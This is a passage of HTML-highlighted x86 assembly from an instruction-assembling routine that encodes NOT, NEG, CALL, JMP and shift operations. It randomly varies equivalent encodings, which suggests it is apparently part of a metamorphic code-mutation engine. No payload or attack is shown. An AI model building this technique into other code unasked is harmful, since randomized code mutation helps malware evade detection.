     </span><span class="sc5">@@Assemble_Next08</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">        </span><span class="sc1">; NOT Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next09</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">        </span><span class="sc1">; Set NOT Reg operation on 2nd opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_NEG8Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">        </span><span class="sc1">; Same as F7 but with 8 bits operands</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Nxx8Reg</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next09</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc0">        </span><span class="sc1">; NEG Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">        </span><span class="sc1">; Set NEG Reg op. on 2nd opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_NEG8Reg</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1h</span><span class="sc0">        </span><span class="sc1">; NOT Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next11</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; Then set NOT Mem op. on 2nd opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_NEG32Mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">        </span><span class="sc1">; Set NOT/NEG/etc. opcode (32 bits)</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Nxx8Mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Set the first opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Construct the memory reference</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                       </span><span class="sc1">; (mixing it with the value in EBX)</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next11</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E5h</span><span class="sc0">        </span><span class="sc1">; NEG Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">         </span><span class="sc1">; Then set NEG Mem on 2nd opcode and</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_NEG32Mem</span><span class="sc0"> </span><span class="sc1">; jump to construct the operation</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next12</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">        </span><span class="sc1">; NOT Mem8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; Set NOT Mem8 op.</span><span class="sc0">
     </span><span class="sc5">@@Assemble_NEG8Mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">        </span><span class="sc1">; Use 8 bits opcode for NOT/NEG</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Nxx8Mem</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next13</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">        </span><span class="sc1">; NEG Mem8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">         </span><span class="sc1">; Then set NEG Mem8 op. on 2nd opc.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_NEG8Mem</span><span class="sc0"> </span><span class="sc1">;  and jump to construct the instrc.</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next14</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">        </span><span class="sc1">; CALL Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next15</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; Set the opcode: FF,(10+mem. ref)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Nxx8Mem</span><span class="sc0"> </span><span class="sc1">; Code mem address</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next15</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">        </span><span class="sc1">; JMP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next16</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; Then set the opcode:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">;  FF,(20+mem ref.)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Nxx8Mem</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next16</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">        </span><span class="sc1">; CALL Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next17</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; Then use the same opcode than</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">        </span><span class="sc1">; CALL Mem but ORing the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Nxx8Reg</span><span class="sc0"> </span><span class="sc1">; with C0 (bits 7&amp;6 active), so we</span><span class="sc0">
                                        </span><span class="sc1">; tell the processor to use bits 2,1,0</span><span class="sc0">
                                        </span><span class="sc1">; as a direct register rather than as</span><span class="sc0">
                                        </span><span class="sc1">; a memory address codification</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Next17</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc0">       </span><span class="sc1">; JMP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next18</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Then, the same as above but with</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">       </span><span class="sc1">; 2nd opcode = 20h OR C0h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Nxx8Reg</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next18</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">       </span><span class="sc1">; SHIFT Reg operation?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next19</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; If it's 1, we can use SHIFT,1 ops.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFT_1</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc0">       </span><span class="sc1">; Use opcode C1 and a mask of E0 to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">       </span><span class="sc1">; get random upper bits in the shift</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT8_1_00</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_SHIFT_x</span><span class="sc0"> </span><span class="sc1">; Set the opcode and the operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Mask it with EDX (00 or E0)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Add the value to shift</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set the Imm in the instruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc1">; Select randomly if we use the ,1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; opcode or the ,x one</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFT_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0">       </span><span class="sc1">; Opcode D1: SHIFT Mem/Reg,1</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Set the opcode in ECX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; Reduce it to SHIFT LEFT/RIGHT</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; Select randomly SHL/ROL or SHR/ROR.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; We have prepared the shifting instr.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">; in the engine to support either SHx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; or ROx indifferently</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Set it into the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Insert the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next19</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">       </span><span class="sc1">; SHIFT Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next20</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Check if it's 1 to see if we can</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; use the ,1 opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFT8_1</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT8_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; Set 1st opcode as C0</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Mask with 00 the upper bits of the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_SHIFT8_1_00</span><span class="sc0"> </span><span class="sc1">; shifting value</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT8_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">   </span><span class="sc1">; Select randomly the using of ,1/,x</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFT8_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">       </span><span class="sc1">; Set 1st opcode as D0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_SHIFT_x</span><span class="sc0"> </span><span class="sc1">; Jump to complete the opcode</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next20</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc0">       </span><span class="sc1">; SHIFT Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Check the value to look if we can</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; use ,1 or ,x</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFTMem_1</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFTMem_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc0">       </span><span class="sc1">; Opcode C1, mask E0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT8Mem_1_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; Make the opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_SHIFTMem_x</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; Set the value with random upper</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; bits for 32 bits shiftings (mask of</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; E0) or upper bits to 0 if 8 bits</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; mask of 00)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFTMem_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; Do we use the ,x opcode?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFTMem_2</span><span class="sc0"> </span><span class="sc1">; Jump if we decided to use it!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D1h</span><span class="sc0">       </span><span class="sc1">; Set D1 opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFTMem_x</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the direction of the shift</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">; Select SHx or ROx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Set it in EBX to mix it with the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc1">; 2nd opcode and code the</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; memory address in the 2nd opc.</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F3h</span><span class="sc0">       </span><span class="sc1">; SHIFT Mem8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next22</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Just the same as above but with</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; opcodes C0 and D0 instead of C1 and</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; D1. And, of course, a mask of 00,</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFT8Mem_1</span><span class="sc0"> </span><span class="sc1">; because the 8 bits shiftings</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT8Mem_2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; don't ignore the upper bits</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">            </span><span class="sc1">; as the 32 bits instructions do</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; (don't ask me why)</span><span class="sc0">
